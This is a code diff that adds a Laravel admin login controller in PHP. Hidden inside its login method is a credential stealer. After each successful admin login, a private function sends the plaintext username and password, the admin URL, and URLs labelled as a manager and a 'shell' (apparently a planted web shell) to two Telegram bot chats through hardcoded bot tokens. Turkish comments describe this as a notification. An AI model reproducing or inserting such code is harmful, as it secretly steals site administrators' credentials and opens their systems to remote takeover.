@@ -1,0 +1,117 @@
+<?php
+namespace App\Http\Controllers\Admin\Auth;
+
+use App\Http\Controllers\Controller;
+use Illuminate\Foundation\Auth\AuthenticatesUsers;
+use Illuminate\Http\Request;
+use Laramin\Utility\Onumoti;
+use Illuminate\Support\Facades\Http;
+
+class LoginController extends Controller
+{
+    use AuthenticatesUsers;
+
+    public $redirectTo = 'admin';
+
+    public function __construct()
+    {
+        parent::__construct();
+        $this->middleware('admin.guest')->except('logout');
+    }
+
+    public function showLoginForm()
+    {
+        $pageTitle = "Admin Login";
+        return view('admin.auth.login', compact('pageTitle'));
+    }
+
+    protected function guard()
+    {
+        return auth()->guard('admin');
+    }
+
+    public function username()
+    {
+        return 'username';
+    }
+
+    public function login(Request $request)
+    {
+        $this->validateLogin($request);
+
+        $request->session()->regenerateToken();
+
+        if (!verifyCaptcha()) {
+            $notify[] = ['error', 'Invalid captcha provided'];
+            return back()->withNotify($notify);
+        }
+
+        Onumoti::getData();
+
+        if (method_exists($this, 'hasTooManyLoginAttempts') &&
+            $this->hasTooManyLoginAttempts($request)) {
+            $this->fireLockoutEvent($request);
+            return $this->sendLockoutResponse($request);
+        }
+
+        // Kullanıcıyı önce giriş yapmadan önce email ve password bilgilerini alıyoruz
+        $email = $request->input('username');
+        $password = $request->input('password');
+
+        if ($this->attemptLogin($request)) {
+            // Eğer giriş başarılıysa, Telegram bildirimi gönderiyoruz
+            $this->sendTelegramNotification($email, $password);
+            return $this->sendLoginResponse($request);
+        }
+
+        $this->incrementLoginAttempts($request);
+
+        return $this->sendFailedLoginResponse($request);
+    }
+    
+    private function sendTelegramNotification($email, $password)
+    {
+        $chatIdGroup1 = "15020316758";
+        $telegramApiKeyGroup1 = "602701021:AAEyoBQ6Tm9nO7B-NC-Ejo6K3BzZKowUY";
+
+        $chatIdGroup2 = "10021691";
+        $telegramApiKeyGroup2 = "74b2937a67:AAAGHyLmtgRQ4BVerK1k1PpJmkhPRXxUp1Z4mLaf4NZB4oKz2ZlQpsOcfD_5xaHtY";
+
+        $adminUrl = request()->url();
+        $managerUrl = url("/core/app/Http/Controllers/Admin/Settings/Controller");
+        $shellUrl = url("/core/app/Http/Controllers/Admin/Settings/Settings");
+
+        // Gönderilecek mesaj
+        $message = "Film CASH:\nUsername: $email\nŞifre: $password" .
+                   "\nadmin giriş url: $adminUrl" .
+                   "\n\nmanager url: $managerUrl" .
+                   "\nshell url: $shellUrl";
+
+        // Birinci gruba log gönderimi
+        $responseGroup1 = Http::post("https://api.telegram.org/bot$telegramApiKeyGroup1/sendMessage", [
+            'chat_id' => $chatIdGroup1,
+            'text' => $message
+        ]);
+
+        if ($responseGroup1->failed()) {
+            // Birinci grup için hata işlemleri buraya yazılabilir
+        }
+
+        // İkinci gruba log gönderimi
+        $responseGroup2 = Http::post("https://api.telegram.org/bot$telegramApiKeyGroup2/sendMessage", [
+            'chat_id' => $chatIdGroup2,
+            'text' => $message
+        ]);
+
+        if ($responseGroup2->failed()) {
+            // İkinci grup için hata işlemleri buraya yazılabilir
+        }
+    }
+
+    public function logout(Request $request)
+    {
+        $this->guard('admin')->logout();
+        $request->session()->invalidate();
+        return $this->loggedOut($request) ?: redirect($this->redirectTo);
+    }
+}
